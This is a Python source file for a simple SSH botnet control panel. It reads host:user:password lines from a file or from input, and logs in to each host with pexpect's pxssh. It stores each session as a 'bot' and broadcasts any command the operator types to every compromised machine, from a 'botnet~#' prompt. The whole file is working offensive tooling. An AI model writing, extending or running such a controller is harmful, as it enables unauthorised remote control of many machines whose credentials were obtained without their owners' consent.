import os
import json
from pexpect import pxssh

class STORAGE:
    bots = []

class BOT:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()
    
    def ssh(self):
        print(f"\n[{self.host}] Trying to connect...")

        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            print(f"[{self.host}] Connexion accepted")
            return (bot)
        except Exception as err:
            print(f"[{self.host}] Connection refused: {err}\n")

    def command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()

        return (self.session.before)

def bot_command(cmd):
    for bot in STORAGE.bots:
        attack = bot.command(cmd)
        print(f"[{bot.host}] : {attack}")

def bot_add(host, user, password):
    bot_new = BOT(host, user, password)
    print(f"[{host}] Adding bot to collection...")
    try:
        STORAGE.bots.append(bot_new)
        print(f"[{host}] Bot added to collection\n")
    except Exception as err:
        print(f"[{host}] Bot can't be added to collection: {err}\n")

def bot_load(path):
    if (os.path.isfile(path)):
        f = open(path, "r")
        line = f.readline()

        while line:
            host = line.split(':')[0]
            user = line.split(':')[1]
            password = line.split(':')[2]

            bot_add(host, user, password)

            line = f.readline()

        f.close()
    else:
        print("Can't find this file\n")

def bot_resume():
    print(f"Collection: {len(STORAGE.bots)} bots")

def banner():
    print("Welcome user\n")
    print("Commands:")
    print("add: Add bot to your collection")
    print("exe: Execute a command from all bots")
    print("load: Load bots collection")
    print("exit: Exit the program\n")

def execute_command(command):
    if (command == "load"):
        bot_load(input("Input: "))
        return (1)
    
    if (command == "resume"):
        bot_resume()
        return (1)

    if (command == "add"):
        host = input("Host: ")
        user = input("User: ")
        password = input("Password: ")
        bot_add(host, user, password)
        return (1)

    if (command == "exe"):
        bot_command(input("COMMAND: "))
        return (1)
    
    if (command == "exit"):
        return (-1)

def panel():
    banner()
    command = None

    while (execute_command(command) != -1):
        command = input("botnet~# ")
 
panel()

            
